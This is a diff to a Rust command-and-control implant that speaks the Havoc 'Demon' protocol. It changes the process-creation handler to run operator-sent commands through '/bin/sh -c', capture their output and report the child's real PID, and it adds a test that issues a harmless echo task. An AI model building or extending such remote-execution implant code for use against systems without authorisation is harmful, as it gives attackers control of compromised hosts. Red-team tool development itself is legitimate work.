@@ -11,7 +11,7 @@
 //!   (`Int32ToBuffer` in the Demon C agent's `Package.c`, parsed by the Go
 //!   teamserver's big-endian `parser.NewParser`).
 
-use std::process::Command as SysCommand;
+use std::process::{Command as SysCommand, Stdio};
 
 use red_cell_common::demon::{
     DemonCommand, DemonFilesystemCommand, DemonPackage, DemonProcessCommand,
@@ -374,21 +374,36 @@ fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     let shell_cmd = translate_to_shell_cmd(&process_path, &process_args_raw);
     info!(shell_cmd = %shell_cmd, "running via /bin/sh -c");
 
-    let sys_output = SysCommand::new("/bin/sh").arg("-c").arg(&shell_cmd).output();
-
-    let (success, pid, output_bytes) = match sys_output {
-        Ok(o) => {
-            let mut combined = o.stdout;
-            if !o.stderr.is_empty() {
-                if !combined.is_empty() {
-                    combined.push(b'\n');
+    let (success, pid, output_bytes) = match SysCommand::new("/bin/sh")
+        .arg("-c")
+        .arg(&shell_cmd)
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()
+    {
+        Ok(child) => {
+            // Capture the child's real PID before blocking on exit.
+            let child_pid = child.id();
+            let output_bytes = match child.wait_with_output() {
+                Ok(o) => {
+                    let mut combined = o.stdout;
+                    if !o.stderr.is_empty() {
+                        if !combined.is_empty() {
+                            combined.push(b'\n');
+                        }
+                        combined.extend_from_slice(&o.stderr);
+                    }
+                    combined
                 }
-                combined.extend_from_slice(&o.stderr);
-            }
-            (true, std::process::id(), combined)
+                Err(e) => {
+                    warn!("ProcCreate: wait_with_output failed: {e}");
+                    format!("error: {e}").into_bytes()
+                }
+            };
+            (true, child_pid, output_bytes)
         }
         Err(e) => {
-            warn!("ProcCreate: /bin/sh execution failed: {e}");
+            warn!("ProcCreate: /bin/sh spawn failed: {e}");
             (false, 0u32, format!("error: {e}").into_bytes())
         }
     };
@@ -746,6 +761,44 @@ mod tests {
             .trim()
             .to_string();
         assert_eq!(out_str, "hello");
+    }
+
+    #[test]
+    fn handle_proc_create_reports_child_pid_not_agent_pid() {
+        // The proc-create callback must carry the spawned child's PID, not std::process::id().
+        let mut config = SpecterConfig::default();
+        let mut payload = 4u32.to_le_bytes().to_vec(); // subcmd = Create
+        payload.extend_from_slice(&0u32.to_le_bytes()); // state
+        payload.extend_from_slice(&le_utf16le_payload("c:\\windows\\system32\\cmd.exe"));
+        payload.extend_from_slice(&le_utf16le_payload("/c echo pid_test"));
+        payload.extend_from_slice(&1u32.to_le_bytes()); // piped
+        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose
+
+        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
+        let result = dispatch(&package, &mut config);
+
+        let DispatchResult::MultiRespond(resps) = result else {
+            panic!("expected MultiRespond, got {result:?}");
+        };
+
+        // Parse the proc payload to extract the PID field.
+        // Format: [subcmd: u32 BE][path: u32 BE len + utf16le bytes][pid: u32 BE][...]
+        let proc_payload = &resps[0].payload;
+        // Skip subcmd (4 bytes), then read the path length to skip the path.
+        let path_len =
+            u32::from_be_bytes(proc_payload[4..8].try_into().expect("path len")) as usize;
+        let pid_offset = 4 + 4 + path_len;
+        let reported_pid = u32::from_be_bytes(
+            proc_payload[pid_offset..pid_offset + 4].try_into().expect("pid bytes"),
+        );
+
+        // The reported PID must be non-zero (child was spawned) and must NOT be our own PID.
+        assert_ne!(reported_pid, 0, "child PID must not be zero");
+        assert_ne!(
+            reported_pid,
+            std::process::id(),
+            "child PID must not equal the agent's own PID"
+        );
     }
 
     #[test]
